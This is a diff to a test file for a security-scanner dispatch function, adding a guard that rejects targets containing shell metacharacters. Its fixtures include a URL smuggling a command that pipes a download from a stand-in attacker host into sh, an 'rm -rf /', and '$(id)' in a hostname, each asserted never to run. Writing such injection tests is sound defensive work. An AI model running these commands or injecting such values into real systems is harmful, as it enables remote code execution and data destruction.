@@ -49,6 +49,7 @@ vi.mock('../utils/logger', () => ({
 
 import {
   dispatchTool, ToolOutOfScopeError, ToolTargetInvalidError, ToolArgumentInjectionError,
+  ToolShellUnsafeError,
 } from '../lib/net/dispatch-tool';
 
 const PROGRAM_ID = 101;
@@ -107,26 +108,16 @@ describe('dispatchTool — adversarial set', () => {
     expect(spawnImpl).not.toHaveBeenCalled();
   });
 
-  it('5. a target containing shell metacharacters → passed as a single execFile arg, never interpreted', async () => {
+  it('5. a target containing shell metacharacters → REJECTED by the shell-unsafe guard, never exec\'d (Addition A hardening — previously "contained as inert data," now rejected outright since execFile only guarantees THIS process is safe, not a dispatched shell-script tool\'s own internals)', async () => {
     isInScopeMock.mockResolvedValue({ allowed: true });
     const hostile = 'https://example.com/$(curl attacker.test/s|sh)#;rm -rf /';
-    const result = await dispatchTool({
+    await expect(dispatchTool({
       tool: 'whatweb',
       target: hostile,
       args: ['{url}'],
       programId: PROGRAM_ID,
-    });
-    // execFile received exactly one array element for {url} — the shell
-    // metacharacters are inert data inside that single argument, never
-    // concatenated into a string a shell could parse. (new URL() percent-
-    // encodes the literal space, but leaves $()| untouched — still inert,
-    // since execFile never invokes a shell to interpret them either way.)
-    expect(spawnImpl).toHaveBeenCalledTimes(1);
-    const [bin, args] = spawnImpl.mock.calls[0];
-    expect(bin).toBe('whatweb');
-    expect(args).toHaveLength(1);
-    expect(args[0]).toContain('$(curl%20attacker.test/s|sh)');
-    expect(result.stdout).toBe('ok');
+    })).rejects.toThrow(ToolShellUnsafeError);
+    expect(spawnImpl).not.toHaveBeenCalled();
   });
 
   it('6. (argument injection) a hostname that resolves to a flag-shaped bare placeholder → rejected, never exec\'d', async () => {
@@ -166,6 +157,41 @@ describe('dispatchTool — adversarial set', () => {
     });
     await expect(result).rejects.toThrow(ToolTargetInvalidError);
     expect(spawnImpl).not.toHaveBeenCalled();
+  });
+
+  it('8. (shell-metacharacter guard, Addition A) a hostname with a shell metacharacter is rejected, never exec\'d', async () => {
+    isInScopeMock.mockResolvedValue({ allowed: true });
+    // new URL('https://a$(id)b.example.com/').hostname is literally "a$(id)b.example.com"
+    // — WHATWG URL doesn't forbid $()` in hostnames, confirmed live.
+    await expect(dispatchTool({
+      tool: 'testssl.sh',
+      target: 'https://a$(id)b.example.com/',
+      args: ['{domain}:443'],
+      programId: PROGRAM_ID,
+    })).rejects.toThrow(ToolShellUnsafeError);
+    expect(spawnImpl).not.toHaveBeenCalled();
+  });
+
+  it('8b. a pipe character surviving in the full URL is rejected too, never exec\'d (backtick is already percent-encoded by URL serialization itself — confirmed: new URL("https://x/`id`").toString() -> ".../%60id%60" — but | survives raw and is still explicitly rejected)', async () => {
+    isInScopeMock.mockResolvedValue({ allowed: true });
+    await expect(dispatchTool({
+      tool: 'nikto',
+      target: 'https://example.com/a|b',
+      args: ['-h', '{url}'],
+      programId: PROGRAM_ID,
+    })).rejects.toThrow(ToolShellUnsafeError);
+    expect(spawnImpl).not.toHaveBeenCalled();
+  });
+
+  it('8c. & and ; in a query string are ALLOWED for the full-URL substitution (real multi-param endpoints must stay probeable)', async () => {
+    isInScopeMock.mockResolvedValue({ allowed: true });
+    await dispatchTool({
+      tool: 'nikto',
+      target: 'https://example.com/search?a=1&b=2;c=3',
+      args: ['-h', '{url}'],
+      programId: PROGRAM_ID,
+    });
+    expect(spawnImpl).toHaveBeenCalled();
   });
 
   it('literal (non-placeholder) args pass through untouched, including ones starting with "-"', async () => {
